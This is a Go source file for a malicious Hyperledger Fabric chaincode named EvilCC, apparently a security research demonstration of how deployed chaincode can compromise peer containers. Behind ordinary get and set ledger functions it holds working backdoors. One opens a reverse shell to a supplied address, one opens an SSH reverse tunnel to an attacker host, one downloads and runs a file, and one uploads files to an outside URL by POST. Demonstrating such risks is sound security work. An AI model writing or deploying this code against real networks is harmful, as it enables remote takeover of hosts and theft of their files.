/*
* Copyright 2018-present, Synopsys, Inc.
* All rights reserved.
*
* This source code is licensed under the MIT license found in the
* LICENSE file in the root directory of this source tree.
*
*/

package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/hyperledger/fabric/core/chaincode/shim"
	"github.com/hyperledger/fabric/protos/peer"
)

// EvilCC implements a malicious chaincode.
type EvilCC struct {
}

// Init is called during chaincode instantiation to initialize the ledger.
func (t *EvilCC) Init(stub shim.ChaincodeStubInterface) peer.Response {
	// Get the args from the transaction proposal
	_, args := stub.GetFunctionAndParameters()
	if len(args) != 2 {
		return shim.Error("wrong arguments. Need key and value.")
	}

	// We store the key and the value on the ledger.
	err := stub.PutState(args[0], []byte(args[1]))
	if err != nil {
		return shim.Error(fmt.Sprintf("error initializing the chaincode: %s", args[0]))
	}
	return shim.Success(nil)
}

// Invoke is called per transaction on the chaincode and contains the
// malicious functionality.
func (t *EvilCC) Invoke(stub shim.ChaincodeStubInterface) peer.Response {

	var result string
	var err error

	// Extract the function and args from the transaction proposal
	switch fn, args := stub.GetFunctionAndParameters(); fn {
	// setValue sets a value on the ledger.
	case "setValue":
		result, err = setValue(stub, args)
	// getValue retrieves the value of a key from the ledger.
	case "getValue":
		result, err = getValue(stub, args)
	// createFile backdoor
	case "createFile":
		result, err = createFile(stub, args)
	// http backdoor
	case "http":
		result, err = httpGet(stub, args)
	// remote shell backdoor
	case "shell":
		result, err = shell(stub, args)
	// ssh connect back
	case "ssh":
		result, err = ssh(stub, args)
	// download item and optionally execute it
	case "httpDrop":
		result, err = httpDrop(stub, args)
	// exfiltrate files via POST requests
	case "httpExfil":
		result, err = httpExfil(stub, args)
	default:
		return shim.Error("wrong invoke method")
	}
	if err != nil {
		return shim.Error(err.Error())
	}

	// Return the result as success payload
	return shim.Success([]byte(result))
}

// shell creates a reverse shell and contacts the "ip:port" in the argument.
func shell(stub shim.ChaincodeStubInterface, args []string) (string, error) {

	if len(args) != 1 {
		return "", fmt.Errorf("wrong arguments. Need an ip:port")
	}

	// Assuming we have the address in first arg
	addr := args[0]

	// Run reverse shell in a goroutine so it does not block the transaction and timeout.
	shellErr := false
	go func(a string) {
		c, err := net.Dial("tcp", a)
		if err != nil {
			shellErr = true
			return
		}
		cmd := exec.Command("/bin/sh")
		cmd.Stdin = c
		cmd.Stdout = c
		cmd.Stderr = c
		cmd.Run()
	}(addr)

	if shellErr {
		return "", fmt.Errorf("invalid address, got %s", addr)
	}

	// Wait five seconds for the shell to be established before returning.
	time.Sleep(time.Second * 5)
	return "Finished", nil
}

// httpGet GETs a URL.
func httpGet(stub shim.ChaincodeStubInterface, args []string) (string, error) {

	if len(args) != 1 {
		return "", fmt.Errorf("wrong arguments. Need a URL")
	}

	// Assuming we have url in first arg
	url := args[0]

	resp, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("error retrieving URL: %s - %v", url, err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("error reading body: %v", err)
	}

	return string(body[:]), nil
}

// createFile creates a file on the container.
func createFile(stub shim.ChaincodeStubInterface, args []string) (string, error) {
	// Don't care about number of arguments.
	if len(args) != 1 {
		return "", fmt.Errorf("wrong arguments. Need filename")
	}

	// Create a random file
	f, err := os.Create("test-file")
	if err != nil {
		return "", fmt.Errorf("error creating file %v", err)
	}
	// Close file after function is completed.
	defer f.Close()

	return "successfully created a file", nil
}

// setValue stores a key/value paid on the ledger and overwrites the previous
// value if the key already exists.
func setValue(stub shim.ChaincodeStubInterface, args []string) (string, error) {
	if len(args) != 2 {
		return "", fmt.Errorf("wrong arguments. Need key and value")
	}

	err := stub.PutState(args[0], []byte(args[1]))
	if err != nil {
		return "", fmt.Errorf("key was not updated: %s", args[0])
	}
	return args[1], nil
}

// getValue returns the value of a key on the ledger.
func getValue(stub shim.ChaincodeStubInterface, args []string) (string, error) {
	if len(args) != 1 {
		return "", fmt.Errorf("wrong arguments. Need a key")
	}

	value, err := stub.GetState(args[0])
	if err != nil {
		return "", fmt.Errorf("could not retrieve key %s - error %s", args[0], err)
	}
	if value == nil {
		return "", fmt.Errorf("key not found: %s", args[0])
	}
	return string(value), nil
}

// ssh connects back to attacker for fun stuff.
func ssh(stub shim.ChaincodeStubInterface, args []string) (string, error) {

	if len(args) != 3 {
		return "", fmt.Errorf("wrong arguments. Need three parameters.")
	}

	//TODO: check for ssh binary and error out if missing; users must install it using shell due to timeout

	// Create the key file from 3rd argument.
	keyContent := args[2]
	f, err := os.Create("sshkey")
	if err != nil {
		return "", fmt.Errorf("error creating file %v", err)
	}
	// Write key to file.
	_, err = f.WriteString(keyContent)
	if err != nil {
		return "", fmt.Errorf("error writing to file %v", err)
	}
	// Close file.
	f.Close()

	_, err = exec.Command("chmod", "600", "/sshkey").Output()
	if err != nil {
		return "", err
	}

	screenCommandArgs := []string{"-dm", "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-R", args[0], "-i", "/sshkey", args[1]}

	go func(args []string) {
		cmd := exec.Command("screen", args...)
		cmd.Run()
	}(screenCommandArgs)

	return fmt.Sprintf("%s", screenCommandArgs), nil
}

// httpDrop downloads a file from the interwebz, stores it in the provided path
// and optionally executes it.
func httpDrop(stub shim.ChaincodeStubInterface, args []string) (string, error) {
	if len(args) != 3 {
		return "", fmt.Errorf("wrong arguments. Need URL, local name, and executeFlag")
	}

	// Not really necessary but makes code more readable.
	url := args[0]
	fileName := args[1]

	// args[2] is a string, not a boolean.
	executeFlag, err := strconv.ParseBool(args[2])
	if err != nil {
		return "", fmt.Errorf("wrong executeFlag. Got %s. Need true/false - err: %v",
			args[2], err)
	}

	// Create target file.
	f, err := os.Create(fileName)
	if err != nil {
		return "", fmt.Errorf("could not create file %s - err: %v", fileName, err)
	}

	// Note: This might take long for large files and transaction will timeout.
	// Add a note to keep payloads small.
	// Download the file.
	r, err := http.Get(url)
	if err != nil {
		return "", fmt.Errorf("error downloading file at %s - err: %v", url, err)
	}
	// Close the body before returning.
	defer r.Body.Close()

	// Write the download to disk.
	_, err := io.Copy(f, r.Body)
	if err != nil {
		return "", fmt.Errorf("error writing file %s to disk - err : %v",
			fileName, err)
	}

	// Close file.
	f.Close()

	// Make file executable and execute it if executeFlag is set.
	if executeFlag {
		// chmod 700
		if err := os.Chmod(fileName, 0700); err != nil {
			return "", fmt.Errorf("error making %s executable - err %v",
				fileName, err)
		}

		// TODO: Add optional arguments.
		// Execute in a goroutine.
		go func() {
			cmd := exec.Command(fileName)
			cmd.Run()
		}()
	}

	return fmt.Sprintf("downloaded file from %s - stored in %s - executed: %v",
		url, fileName, executeFlag), nil
}

// httpExfil uploads a file with a POST request some endpoint.
func httpExfil(stub shim.ChaincodeStubInterface, args []string) (string, error) {
	if len(args) != 2 {
		return "", fmt.Errorf("wrong arguments. Need a URL and filename")
	}

	url := args[0]
	fileName := args[1]

	// Open file.
	f, err := os.OpenFile(fileName, os.O_RDONLY, 0600)
	if err != nil {
		return "", fmt.Errorf("could not open %s file - error %v", fileName, err)
	}
	defer f.Close()

	// Create the request.
	r, err := http.NewRequest("POST", url, f)
	if err != nil {
		return "", fmt.Errorf("could not create POST request to %s, err: %v",
			url, err)
	}

	r.Header.Set("Content-Type", "multipart/form-data")
	// Optional special header to detect requests.
	r.Header.Set("Type", "Chaincode Exfil")

	// Send the request.
	c := &http.Client{}
	resp, err := c.Do(r)
	if err != nil {
		return "", fmt.Errorf("POST request to %s unsuccessful, err: %v", url, err)
	}
	defer resp.Body.Close()

	return fmt.Sprintf("%s uploaded to %s", fileName, url), nil
}

// main starts the chaincode.
func main() {
	if err := shim.Start(new(EvilCC)); err != nil {
		fmt.Printf("Error starting EvilCC chaincode: %s", err)
	}
}
